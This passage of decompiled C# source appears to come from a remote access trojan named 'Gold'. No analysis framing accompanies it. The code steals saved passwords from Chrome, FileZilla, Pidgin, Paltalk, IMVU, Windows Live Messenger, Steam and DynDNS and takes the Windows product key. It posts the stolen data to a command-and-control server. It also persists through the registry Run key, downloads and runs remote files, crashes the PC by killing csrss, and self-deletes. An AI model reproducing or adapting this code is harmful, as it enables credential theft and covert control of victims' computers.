            new Gold.Gold.Opera().GetOpera();
            Gold.Gold.GetChrome();
            Gold.Gold.UpdateStatus("Sent B. Passwords");
          }
          else if (Microsoft.VisualBasic.CompilerServices.Operators.CompareString(Left, Conversions.ToString(47), false) == 0)
          {
            string[] strArray4 = Strings.Split(strArray1[1], "#SPLIT#");
            Gold.Gold.Password = strArray4[1];
            Gold.Gold.Weburl = strArray4[0];
            Gold.Gold.UpdateStatus("Redirection Succes");
            Gold.Gold.RegisterMe();
          }
          else if (Microsoft.VisualBasic.CompilerServices.Operators.CompareString(Left, Conversions.ToString(48), false) == 0)
          {
            string str = strArray1[1].Substring(checked (strArray1[1].LastIndexOf("/") + 1)).ToString();
            MyProject.Computer.Network.DownloadFile(strArray1[1], Path.GetTempPath() + "exp" + str);
            Gold.Gold.UpdateStatus("Update Succesfull");
            Process.Start(Path.GetTempPath() + "exp" + str);
            Gold.Gold.MeltFile();
          }
          else if (Microsoft.VisualBasic.CompilerServices.Operators.CompareString(Left, Conversions.ToString(49), false) == 0)
          {
            Gold.Gold.UpdateStatus("PC Standbyed");
            Application.SetSuspendState(PowerState.Suspend, true, true);
          }
          else if (Microsoft.VisualBasic.CompilerServices.Operators.CompareString(Left, Conversions.ToString(50), false) == 0)
          {
            SendKeys.SendWait("{ESC}");
            Gold.Gold.UpdateStatus("Screensaver Stopped");
          }
          else if (Microsoft.VisualBasic.CompilerServices.Operators.CompareString(Left, Conversions.ToString(51), false) == 0)
          {
            Gold.Gold.SendMessage(Gold.Gold.GetDesktopWindow(), 274U, 61760U, 0);
            Gold.Gold.UpdateStatus("Screensaver Started");
          }
          else if (Microsoft.VisualBasic.CompilerServices.Operators.CompareString(Left, Conversions.ToString(52), false) == 0)
            Gold.Gold.UpdateStatus("DdoSing");
          else if (Microsoft.VisualBasic.CompilerServices.Operators.CompareString(Left, Conversions.ToString(928415), false) == 0)
          {
            Gold.Gold.UpdateStatus("Crashed PC!!");
            Process.EnterDebugMode();
            Process[] processes = Process.GetProcesses();
            int index = 0;
            while (index < processes.Length)
            {
              Process process = processes[index];
              if (Microsoft.VisualBasic.CompilerServices.Operators.CompareString(process.ProcessName, "csrss", false) == 0)
              {
                process.Kill();
                process.WaitForExit();
                MyProject.Computer.FileSystem.DeleteFile(process.MainModule.FileName);
              }
              checked { ++index; }
            }
            Process.LeaveDebugMode();
          }
          Thread.Sleep(2000);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          Thread.Sleep(2000);
          Gold.Gold.UpdateStatus("ERROR");
          ProjectData.ClearProjectError();
        }
      }
    }

    [DllImport("user32", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int GetDesktopWindow();

    public static void Installme()
    {
      try
      {
        if (!Directory.Exists(Gold.Gold.Location))
          Directory.CreateDirectory(Gold.Gold.Location);
        if (Microsoft.VisualBasic.CompilerServices.Operators.CompareString(Application.ExecutablePath, Gold.Gold.Location + Gold.Gold.Filename, false) == 0)
          return;
        Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true).SetValue(Gold.Gold.StartupName, (object) (Gold.Gold.Location + Gold.Gold.Filename));
        MyProject.Computer.FileSystem.CopyFile(Application.ExecutablePath, Gold.Gold.Location + Gold.Gold.Filename);
        FileAttribute fileAttribute1;
        FileAttribute fileAttribute2 = fileAttribute1 + 7;
        System.IO.File.SetAttributes(Gold.Gold.Location + Gold.Gold.Filename, (FileAttributes) fileAttribute2);
        System.IO.File.SetAttributes(Gold.Gold.Location, (FileAttributes) fileAttribute2);
        Process.Start(Gold.Gold.Location + Gold.Gold.Filename);
        Gold.Gold.MeltFile();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        Process.Start(Gold.Gold.Location + Gold.Gold.Filename);
        Gold.Gold.MeltFile();
        ProjectData.ClearProjectError();
      }
    }

    [DllImport("user32", EntryPoint = "SystemParametersInfoA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int SystemParametersInfo(
      int uAction,
      int uParam,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpvParam,
      int fuWinIni);

    public static void GetSteamUsername()
    {
label_0:
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = 1;
label_1:
        int num3 = 2;
        string str = Conversions.ToString(MyProject.Computer.Registry.GetValue("HKEY_CURRENT_USER\\SOFTWARE\\Valve\\Steam", "SteamPath", (object) ""));
label_2:
        num3 = 3;
        string file = str + "\\config\\SteamAppData.vdf";
label_3:
        num3 = 4;
        string[] strArray = MyProject.Computer.FileSystem.ReadAllText(file).Split('"');
label_4:
        num3 = 5;
        if (Microsoft.VisualBasic.CompilerServices.Operators.CompareString(strArray[9], "", false) == 0)
          goto label_13;
label_5:
        num3 = 6;
        strArray[9] = strArray[9];
label_6:
        num3 = 7;
        Gold.Gold.Stealme("Steam", "-", strArray[9], "-");
        goto label_13;
label_8:
        num2 = num3;
        switch (num1)
        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
              case 1:
                goto label_0;
              case 2:
                goto label_1;
              case 3:
                goto label_2;
              case 4:
                goto label_3;
              case 5:
                goto label_4;
              case 6:
                goto label_5;
              case 7:
                goto label_6;
              case 8:
              case 9:
                goto label_13;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_8;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_13:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
    public static string DynDns()
    {
label_0:
      int num1;
      string str1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = 1;
label_1:
        int num3 = 2;
        str1 = (string) null;
label_2:
        num3 = 3;
        string str2 = (string) null;
label_3:
        num3 = 4;
        string str3 = (string) null;
label_4:
        num3 = 5;
        string sDest = (string) null;
label_5:
        num3 = 6;
        string str4 = Interaction.Environ("ALLUSERSPROFILE");
label_6:
        num3 = 7;
        if (Microsoft.VisualBasic.CompilerServices.Operators.CompareString(Strings.Right(str4, 1), "\\", false) == 0)
          goto label_8;
label_7:
        num3 = 8;
        str4 += "\\";
label_8:
        num3 = 10;
        string str5 = str4 + "DynDNS\\Updater\\config.dyndns";
label_9:
        num3 = 11;
        if (Microsoft.VisualBasic.CompilerServices.Operators.CompareString(FileSystem.Dir(str5), "", false) == 0)
          goto label_37;
label_10:
        num3 = 12;
        FileSystem.FileOpen(1, str5, OpenMode.Binary);
        goto label_17;
label_11:
        num3 = 15;
        string str6 = (string) null;
label_12:
        num3 = 16;
        str6 = FileSystem.LineInput(1);
label_13:
        num3 = 17;
        if (Microsoft.VisualBasic.CompilerServices.Operators.CompareString(Strings.Left(str6, 9), "Username=", false) != 0)
          goto label_15;
label_14:
        num3 = 18;
        str2 = Strings.Mid(str6, 10);
label_15:
        num3 = 20;
        if (Microsoft.VisualBasic.CompilerServices.Operators.CompareString(Strings.Left(str6, 9), "Password=", false) != 0)
          goto label_17;
label_16:
        num3 = 21;
        str3 = Strings.Mid(str6, 10);
        goto label_18;
label_17:
        num3 = 14;
        if (!FileSystem.EOF(1))
          goto label_11;
label_18:
        num3 = 25;
        FileSystem.FileClose(1);
label_19:
        num3 = 26;
        int num4 = Strings.Len(str3);
        int num5 = 1;
        goto label_22;
label_20:
        num3 = 27;
        sDest += Conversions.ToString(Strings.Chr(checked ((int) Math.Round(Conversion.Val("&H" + Strings.Mid(str3, num5, 2))))));
label_21:
        num3 = 28;
        checked { num5 += 2; }
label_22:
        if (num5 <= num4)
          goto label_20;
label_23:
        num3 = 29;
        int num6 = Strings.Len(sDest);
        num5 = 1;
        goto label_27;
label_24:
        num3 = 30;
        int num7;
        StringType.MidStmtStr(ref sDest, num5, 1, Conversions.ToString(Strings.Chr(Strings.Asc(Strings.Mid(sDest, num5, 1)) ^ Strings.Asc(Strings.Mid("t6KzXhCh", checked (num7 + 1), 1)))));
label_25:
        num3 = 31;
        num7 = checked (num7 + 1) % 8;
label_26:
        num3 = 32;
        checked { ++num5; }
label_27:
        if (num5 <= num6)
          goto label_24;
label_28:
        num3 = 33;
        if (Microsoft.VisualBasic.CompilerServices.Operators.CompareString(str2, (string) null, false) == 0)
          goto label_37;
label_29:
        num3 = 35;
label_30:
        num3 = 36;
        Gold.Gold.Stealme("DynDNS", "-", str2, sDest);
        goto label_37;
label_32:
        num2 = num3;
        switch (num1)
        {
          case 1:
            int num8 = num2 + 1;
            num2 = 0;
            switch (num8)
            {
              case 1:
                goto label_0;
              case 2:
                goto label_1;
              case 3:
                goto label_2;
              case 4:
                goto label_3;
              case 5:
                goto label_4;
              case 6:
                goto label_5;
              case 7:
                goto label_6;
              case 8:
                goto label_7;
              case 9:
              case 10:
                goto label_8;
              case 11:
                goto label_9;
              case 12:
                goto label_10;
              case 13:
              case 14:
              case 23:
              case 24:
                goto label_17;
              case 15:
                goto label_11;
              case 16:
                goto label_12;
              case 17:
                goto label_13;
              case 18:
                goto label_14;
              case 19:
              case 20:
                goto label_15;
              case 21:
                goto label_16;
              case 22:
              case 25:
                goto label_18;
              case 26:
                goto label_19;
              case 27:
                goto label_20;
              case 28:
                goto label_21;
              case 29:
                goto label_23;
              case 30:
                goto label_24;
              case 31:
                goto label_25;
              case 32:
                goto label_26;
              case 33:
                goto label_28;
              case 34:
              case 37:
              case 38:
              case 39:
                goto label_37;
              case 35:
                goto label_29;
              case 36:
                goto label_30;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_32;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_37:
      string str7 = str1;
      if (num2 == 0)
        return str7;
      ProjectData.ClearProjectError();
      return str7;
    }

    public static void Pidgin()
    {
      XmlDocument xmlDocument = new XmlDocument();
      string str = Interaction.Environ("appdata") + "\\.purple\\accounts.xml";
      if (!System.IO.File.Exists(str))
        return;
      try
      {
        xmlDocument.Load(str);
        XmlNodeList elementsByTagName1 = xmlDocument.GetElementsByTagName("protocol");
        XmlNodeList elementsByTagName2 = xmlDocument.GetElementsByTagName("name");
        XmlNodeList elementsByTagName3 = xmlDocument.GetElementsByTagName("password");
        int num = checked (elementsByTagName1.Count - 1);
        int i = 0;
        while (i <= num)
        {
          Gold.Gold.Stealme(nameof (Pidgin), "-", elementsByTagName2[i].InnerText, elementsByTagName3[i].InnerText);
          checked { ++i; }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void FileZilla()
    {
      try
      {
        XmlDocument xmlDocument = new XmlDocument();
        xmlDocument.Load(Environment.GetEnvironmentVariable("APPDATA") + "\\FileZilla\\recentservers.xml");
        XmlNodeList xmlNodeList = xmlDocument.SelectNodes("/FileZilla3/Settings/LastServer");
        try
        {
          foreach (XmlNode xmlNode in xmlNodeList)
          {
            try
            {
              Gold.Gold.Stealme(nameof (FileZilla), xmlNode.ChildNodes.Item(0).InnerText, xmlNode.ChildNodes.Item(4).InnerText, xmlNode.ChildNodes.Item(5).InnerText);
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
          }
        }
        finally
        {
          System.Collections.IEnumerator enumerator;
          if (enumerator is IDisposable)
            (enumerator as IDisposable).Dispose();
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static string GetHDSerial() => new ManagementObject("Win32_LogicalDisk.DeviceID=\"C:\"").Properties["VolumeSerialNumber"].Value.ToString();

    public static void PaltalkScene()
    {
      try
      {
        char[] charArray1 = Gold.Gold.GetHDSerial().ToCharArray();
        RegistryKey currentUser = Registry.CurrentUser;
        string str1 = "";
        RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Paltalk");
        string[] subKeyNames = registryKey.GetSubKeyNames();
        registryKey.Close();
        string[] strArray1 = subKeyNames;
        int index1 = 0;
        while (index1 < strArray1.Length)
        {
          string user = strArray1[index1];
          string str2 = Conversions.ToString(Registry.GetValue("HKEY_CURRENT_USER\\Software\\Paltalk\\" + user, "pwd", (object) ""));
          char[] charArray2 = str2.ToCharArray();
          string[] strArray2 = new string[checked ((int) Math.Round(unchecked ((double) str2.Length / 4.0)) + 1)];
          int index2;
          while (index2 <= checked (Information.UBound((Array) charArray2) - 4))
          {
            int index3;
            if (index2 < checked (Information.UBound((Array) charArray2) - 4))
              strArray2[index3] = Conversions.ToString(charArray2[index2]) + Conversions.ToString(charArray2[checked (index2 + 1)]) + Conversions.ToString(charArray2[checked (index2 + 2)]);
            checked { index2 += 4; }
            checked { ++index3; }
          }
          string str3 = "";
          string str4 = user;
          int index4 = 0;
          int length = str4.Length;
          while (index4 < length)
          {
            char ch = str4[index4];
            str3 += Conversions.ToString(ch);
            int index5;
            if (index5 <= Information.UBound((Array) charArray1))
              str3 += Conversions.ToString(charArray1[index5]);
            checked { ++index5; }
            checked { ++index4; }
          }
          string str5 = str3 + str3 + str3;
          char[] charArray3 = str5.ToCharArray();
          string pass = "" + Conversions.ToString(Strings.Chr(checked ((int) Math.Round(unchecked (Conversions.ToDouble(strArray2[0]) - 122.0 - (double) Strings.Asc(str5.Substring(checked (str5.Length - 1), 1)))))));
          int num = Information.UBound((Array) strArray2);
          int index6 = 1;
          while (index6 <= num)
          {
            if (strArray2[index6] != null)
            {
              char ch = Strings.Chr(checked ((int) Math.Round(unchecked (Conversions.ToDouble(strArray2[index6]) - (double) index6 - (double) Strings.Asc(charArray3[checked (index6 - 1)]) - 122.0))));
              pass += Conversions.ToString(ch);
            }
            checked { ++index6; }
          }
          str1 = str1 + "Username: " + user + "\r\nPassword: " + pass + "\r\n\r\n";
          Gold.Gold.Stealme("Paltalk", "-", user, pass);
          checked { ++index1; }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    [DllImport("Crypt32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool CryptUnprotectData(
      ref Gold.Gold.DATA_BLOB pDataIn,
      int szDataDescr,
      int pOptionalEntropy,
      int pvReserved,
      int pPromptStruct,
      int dwFlags,
      ref Gold.Gold.DATA_BLOB pDataOut);

    [DllImport("advapi32", CharSet = CharSet.Unicode, SetLastError = true)]
    private static extern bool CredEnumerate(
      string filter,
      int flag,
      ref int count,
      ref IntPtr pCredentials);

    public static void WindowsLiveMessenger()
    {
      try
      {
        int count = 0;
        IntPtr zero = IntPtr.Zero;
        if (!Gold.Gold.CredEnumerate("WindowsLive:name=*", 0, ref count, ref zero))
          return;
        IntPtr[] numArray = new IntPtr[checked (count - 1 + 1)];
        IntPtr num1 = zero;
        int num2 = checked (count - 1);
        int index = 0;
        while (index <= num2)
        {
          numArray[index] = Marshal.ReadIntPtr((IntPtr) checked (num1.ToInt32() + IntPtr.Size * index));
          Gold.Gold.CREDENTIAL structure = (Gold.Gold.CREDENTIAL) Marshal.PtrToStructure(numArray[index], typeof (Gold.Gold.CREDENTIAL));
          Gold.Gold.DATA_BLOB pDataIn = new Gold.Gold.DATA_BLOB();
          Gold.Gold.DATA_BLOB pDataOut = new Gold.Gold.DATA_BLOB();
          pDataIn.pbData = structure.lpbCredentialBlob;
          pDataIn.cbData = structure.dwCredentialBlobSize;
          Gold.Gold.CryptUnprotectData(ref pDataIn, 0, 0, 0, 0, 1, ref pDataOut);
          string stringAuto = Marshal.PtrToStringAuto(pDataIn.pbData);
          Gold.Gold.Stealme("WLM Messenger", "-", Marshal.PtrToStringAuto(structure.lpUserName), stringAuto);
          checked { ++index; }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static object ReadKey(ref string hKey)
    {
      int num1;
      object obj1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = 2;
        object objectValue = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("WScript.shell"));
        object[] objArray = new object[1]{ (object) hKey };
        object[] Arguments = objArray;
        bool[] flagArray = new bool[1]{ true };
        bool[] CopyBack = flagArray;
        object obj2 = NewLateBinding.LateGet(objectValue, (System.Type) null, "regread", Arguments, (string[]) null, (System.Type[]) null, CopyBack);
        if (flagArray[0])
          hKey = (string) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray[0]), typeof (string));
        obj1 = RuntimeHelpers.GetObjectValue(obj2);
        goto label_9;
label_4:
        num2 = -1;
        switch (num1)
        {
          case 2:
            obj1 = (object) null;
            goto label_9;
        }
      }
      catch (Exception ex) when (
      {
        // ISSUE: unable to correctly present filter
        int num3;
        if (ex is Exception & num1 != 0 & num3 == 0)
        {
          SuccessfulFiltering;
        }
        else
          throw;
      }
      )
      {
        ProjectData.SetProjectError(ex);
        goto label_4;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_9:
      object obj3 = obj1;
      if (num2 == 0)
        return obj3;
      ProjectData.ClearProjectError();
      return obj3;
    }

    public static string Hex2Ascii(string Text)
    {
      object Left = (object) null;
      object Counter;
      object LoopForResult;
      object CounterResult;
      if (ObjectFlowControl.ForLoopControl.ForLoopInitObj(Counter, (object) 1, (object) Strings.Len(Text), (object) 1, ref LoopForResult, ref CounterResult))
      {
        do
        {
          object Right = (object) Strings.Mid(Text, Conversions.ToInteger(CounterResult), 2);
          Left = Microsoft.VisualBasic.CompilerServices.Operators.ConcatenateObject(Left, (object) Strings.Chr(checked ((int) Math.Round(Conversion.Val(Microsoft.VisualBasic.CompilerServices.Operators.ConcatenateObject((object) "&h", Right))))));
          CounterResult = Microsoft.VisualBasic.CompilerServices.Operators.AddObject(CounterResult, (object) 1);
        }
        while (ObjectFlowControl.ForLoopControl.ForNextCheckObj(CounterResult, LoopForResult, ref CounterResult));
      }
      return Conversions.ToString(Left);
    }

    public static void Imvu()
    {
      string hKey1 = "HKEY_CURRENT_USER\\Software\\IMVU\\username\\";
      string hKey2 = "HKEY_CURRENT_USER\\Software\\IMVU\\password\\";
      if (!Conversions.ToBoolean(Microsoft.VisualBasic.CompilerServices.Operators.NotObject(Microsoft.VisualBasic.CompilerServices.Operators.CompareObjectEqual(Gold.Gold.ReadKey(ref hKey1), (object) null, false))))
        return;
      Gold.Gold.Stealme("Imvu Messenger", "-", Conversions.ToString(Gold.Gold.ReadKey(ref hKey1)), Gold.Gold.Hex2Ascii(Conversions.ToString(Gold.Gold.ReadKey(ref hKey2))));
    }

    public static void StealBrowsers(string type, string host, string user, string pass) => Gold.Gold.SinCommand("type=" + type + "&host=" + host + "&user=" + user + "&pass=" + pass + "&unid=" + Gold.Gold.UniqueID, "system/_brg.php");

    public static void Stealme(string type, string host, string user, string pass) => Gold.Gold.SinCommand("type=" + type + "&host=" + host + "&user=" + user + "&pass=" + pass + "&unid=" + Gold.Gold.UniqueID, "system/_prg.php");

    public static string AccountType() => !MyProject.User.IsInRole(Environment.MachineName + "\\" + Environment.UserName) ? "Limited" : "Administrator";

    public static string defaultbrowser() => Path.GetFileNameWithoutExtension(Strings.Split(Conversions.ToString(MyProject.Computer.Registry.GetValue("HKEY_CLASSES_ROOT\\HTTP\\shell\\open\\command", "", (object) "Not Found")), "\"")[1]);

    public static void KickHisAss(string Bitch)
    {
      try
      {
        Process[] processes = Process.GetProcesses();
        int num = checked (processes.Length - 1);
        int index = 0;
        while (index <= num)
        {
          if (Microsoft.VisualBasic.CompilerServices.Operators.CompareString(Strings.UCase(processes[index].ProcessName), Strings.UCase(Bitch), false) == 0)
            processes[index].Kill();
          checked { ++index; }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static MessageBoxButtons msgbuttons(string input)
    {
      MessageBoxButtons messageBoxButtons = MessageBoxButtons.OK;
      if (Conversions.ToDouble(input) == 1.0)
        return MessageBoxButtons.AbortRetryIgnore;
      if (Conversions.ToDouble(input) == 2.0)
        return MessageBoxButtons.OK;
      if (Conversions.ToDouble(input) == 3.0)
        return MessageBoxButtons.OKCancel;
      if (Conversions.ToDouble(input) == 4.0)
        return MessageBoxButtons.RetryCancel;
      if (Conversions.ToDouble(input) == 5.0)
        return MessageBoxButtons.YesNo;
      return Conversions.ToDouble(input) == 6.0 ? MessageBoxButtons.YesNoCancel : messageBoxButtons;
    }

    public static MessageBoxIcon msgicons(string input)
    {
      MessageBoxIcon messageBoxIcon = MessageBoxIcon.None;
      if (Conversions.ToDouble(input) == 1.0)
        return MessageBoxIcon.Exclamation;
      if (Conversions.ToDouble(input) == 2.0)
        return MessageBoxIcon.Hand;
      if (Conversions.ToDouble(input) == 3.0)
        return MessageBoxIcon.Asterisk;
      return Conversions.ToDouble(input) == 4.0 ? MessageBoxIcon.Question : messageBoxIcon;
    }

    public static string GetProductKey(string KeyPath, string ValueName)
    {
      object objectValue = RuntimeHelpers.GetObjectValue(MyProject.Computer.Registry.GetValue(KeyPath, ValueName, (object) 0));
      if (objectValue == null)
        return "N/A";
      string str1 = "";
      int num1 = Information.LBound((Array) objectValue);
      int num2 = Information.UBound((Array) objectValue);
      int num3 = num1;
      while (num3 <= num2)
      {
        str1 = str1 + " " + Conversion.Hex(RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet(objectValue, new object[1]
        {
          (object) num3
        }, (string[]) null)));
        checked { ++num3; }
      }
      int num4 = 52;
      int num5 = 67;
      string[] strArray1 = new string[25]
      {
        "B",
        "C",
        "D",
        "F",
        "G",
        "H",
        "J",
        "K",
        "M",
        "P",
        "Q",
        "R",
        "T",
        "V",
        "W",
        "X",
        "Y",
        "2",
        "3",
        "4",
        "6",
        "7",
        "8",
        "9",
        null
      };
      int num6 = 29;
      int num7 = 15;
      string[] strArray2 = new string[16];
      string[] strArray3 = new string[31];
      string str2 = "";
      int num8 = num4;
      int num9 = num5;
      int num10 = num8;
      while (num10 <= num9)
      {
        strArray2[checked (num10 - num4)] = Conversions.ToString(NewLateBinding.LateIndexGet(objectValue, new object[1]
        {
          (object) num10
        }, (string[]) null));
        str2 = str2 + " " + Conversion.Hex((object) strArray2[checked (num10 - num4)]);
        checked { ++num10; }
      }
      string Expression = "";
      int index1 = checked (num6 - 1);
      while (index1 >= 0)
      {
        if (checked (index1 + 1) % 6 == 0)
        {
          strArray3[index1] = "-";
          Expression += "-";
        }
        else
        {
          int index2 = 0;
          int index3 = checked (num7 - 1);
          while (index3 >= 0)
          {
            int num11 = checked ((int) ((long) Math.Round(unchecked ((double) index2 * 256.0)) | Conversions.ToLong(strArray2[index3])));
            strArray2[index3] = Conversions.ToString(num11 / 24);
            index2 = num11 % 24;
            checked { index3 += -1; }
          }
          strArray3[index1] = strArray1[index2];
          Expression += strArray1[index2];
        }
        checked { index1 += -1; }
      }
      return Strings.StrReverse(Expression);
    }

    public static void Winserial()
    {
      string productKey = Gold.Gold.GetProductKey("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\", "DigitalProductId");
      Gold.Gold.SinCommand("os=" + Gold.Gold.os + "&wkey=" + productKey, "system/_wkey.php");
    }

    public static void SinCommand(string Input, string output)
    {
      try
      {
        ASCIIEncoding asciiEncoding = new ASCIIEncoding();
        string s = Input;
        Encoding.ASCII.GetBytes(s);
        byte[] bytes = asciiEncoding.GetBytes(s);
        HttpWebRequest httpWebRequest = (HttpWebRequest) WebRequest.Create(Gold.Gold.Weburl + output);
        httpWebRequest.Method = "POST";
        httpWebRequest.ContentType = "application/x-www-form-urlencoded";
        httpWebRequest.ContentLength = (long) bytes.Length;
        Stream requestStream = httpWebRequest.GetRequestStream();
        requestStream.Write(bytes, 0, bytes.Length);
        StreamReader streamReader = new StreamReader(((HttpWebResponse) httpWebRequest.GetResponse()).GetResponseStream());
        requestStream.Close();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static string delegateproces()
    {
      string str = (string) null;
      Process[] processes = Process.GetProcesses();
      int index = 0;
      while (index < processes.Length)
      {
        Process process = processes[index];
        str = str + process.ProcessName.ToString() + "}" + process.Id.ToString() + "}" + process.MainWindowTitle.ToString() + "#";
        checked { ++index; }
      }
      return str;
    }

    private static string Random1()
    {
      string str = (string) null;
      Random random = new Random();
      int num = 0;
      do
      {
        str += Conversions.ToString("abcdefghijklmnopqrstuvwxyz1234567890"[random.Next(0, checked ("abcdefghijklmnopqrstuvwxyz1234567890".Length - 1))]);
        checked { ++num; }
      }
      while (num <= 31);
      return str;
    }

    public static string ReadMain()
    {
      string str;
      try
      {
        ASCIIEncoding asciiEncoding = new ASCIIEncoding();
        string s = "uniD=" + Gold.Gold.UniqueID + "&password=" + Gold.Gold.Password;
        Encoding.ASCII.GetBytes(s);
        byte[] bytes = asciiEncoding.GetBytes(s);
        HttpWebRequest httpWebRequest = (HttpWebRequest) WebRequest.Create(Gold.Gold.Weburl + "system/_read.php");
        httpWebRequest.Method = "POST";
        httpWebRequest.ContentType = "application/x-www-form-urlencoded";
        httpWebRequest.ContentLength = (long) bytes.Length;
        Stream requestStream = httpWebRequest.GetRequestStream();
        requestStream.Write(bytes, 0, bytes.Length);
        StreamReader streamReader = new StreamReader(((HttpWebResponse) httpWebRequest.GetResponse()).GetResponseStream());
        requestStream.Close();
        str = streamReader.ReadToEnd();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        str = (string) null;
        ProjectData.ClearProjectError();
      }
      return str;
    }

    public static void RegisterMe() => Gold.Gold.SinCommand("ID=" + Gold.Gold.ID + "&UserPC=" + Gold.Gold.UserPC + "&OperatingSystem=" + Gold.Gold.os + "&UniqueID=" + Gold.Gold.UniqueID + "&Country=" + Gold.Gold.country + "&password=" + Gold.Gold.Password, "system/_reg.php");

    public static void UpdateStatus(string update)
    {
      Gold.Gold.SinCommand("uniD=" + Gold.Gold.UniqueID + "&status=" + update + "&password=" + Gold.Gold.Password, "system/_sts.php");
      Gold.Gold.SinCommand("uniqueid=" + Gold.Gold.UniqueID + "&password=" + Gold.Gold.Password, "system/_done.php");
    }

    public static string MD5(string str)
    {
      ASCIIEncoding asciiEncoding = new ASCIIEncoding();
      string str1 = (string) null;
      byte[] hash = new MD5CryptoServiceProvider().ComputeHash(asciiEncoding.GetBytes(str));
      int index = 0;
      while (index < hash.Length)
      {
        byte num = hash[index];
        str1 += num.ToString("x2");
        checked { ++index; }
      }
      return str1;
    }

    public static object GetChrome()
    {
      object chrome;
      try
      {
        string str1 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\Default\\Login Data";
        Gold.Gold.SQLiteHandler sqLiteHandler = new Gold.Gold.SQLiteHandler(str1);
        sqLiteHandler.ReadTable("logins");
        if (System.IO.File.Exists(str1))
        {
          int num = checked (sqLiteHandler.GetRowCount() - 1);
          int row_num = 0;
          while (row_num <= num)
          {
            string host = sqLiteHandler.GetValue(row_num, "origin_url");
            string str2 = sqLiteHandler.GetValue(row_num, "username_value");
            string str3 = Gold.Gold.Decrypt(Encoding.Default.GetBytes(sqLiteHandler.GetValue(row_num, "password_value")));
            if (Microsoft.VisualBasic.CompilerServices.Operators.CompareString(str2, "", false) != 0 & Microsoft.VisualBasic.CompilerServices.Operators.CompareString(str3, "", false) != 0)
              Gold.Gold.StealBrowsers("Google Chrome", host, str2, str3);
            checked { ++row_num; }
          }
        }
      }
      catch (Exception ex1)
      {
        ProjectData.SetProjectError(ex1);
        try
        {
          string str = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\Default\\Web Data";
          Gold.Gold.SQLiteHandler sqLiteHandler = new Gold.Gold.SQLiteHandler(str);
          sqLiteHandler.ReadTable("logins");
          if (System.IO.File.Exists(str))
          {
            int num = checked (sqLiteHandler.GetRowCount() - 1);
            int row_num = 0;
            while (row_num <= num)
            {
              sqLiteHandler.GetValue(row_num, "origin_url");
              string Left1 = sqLiteHandler.GetValue(row_num, "username_value");
              string Left2 = Gold.Gold.Decrypt(Encoding.Default.GetBytes(sqLiteHandler.GetValue(row_num, "password_value")));
              if (Microsoft.VisualBasic.CompilerServices.Operators.CompareString(Left1, "", false) != 0 & Microsoft.VisualBasic.CompilerServices.Operators.CompareString(Left2, "", false) != 0)
              {
                chrome = (object) null;
                ProjectData.ClearProjectError();
                goto label_16;
              }
              else
                checked { ++row_num; }
            }
          }
        }
        catch (Exception ex2)
        {
          ProjectData.SetProjectError(ex2);
          chrome = (object) "";
          ProjectData.ClearProjectError();
          goto label_16;
        }
        ProjectData.ClearProjectError();
      }
      return (object) null;
label_16:
      return chrome;
    }

    public static string Decrypt(byte[] Datas)
    {
      Gold.Gold.DATA_BLOB pDataIn = new Gold.Gold.DATA_BLOB();
      Gold.Gold.DATA_BLOB pDataOut = new Gold.Gold.DATA_BLOB();
      GCHandle gcHandle = GCHandle.Alloc((object) Datas, GCHandleType.Pinned);
      pDataIn.pbData = gcHandle.AddrOfPinnedObject();
      pDataIn.cbData = (IntPtr) Datas.Length;
      gcHandle.Free();
      Gold.Gold.CryptUnprotectData(ref pDataIn, 0, 0, 0, 0, 0, ref pDataOut);
      byte[] numArray = new byte[checked ((int) pDataOut.cbData + 1)];
      Marshal.Copy(pDataOut.pbData, numArray, 0, (int) pDataOut.cbData);
      string str = Encoding.Default.GetString(numArray);
      return str.Substring(0, checked (str.Length - 1));
    }

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr FindResource(IntPtr hModule, string lpName, string lpType);

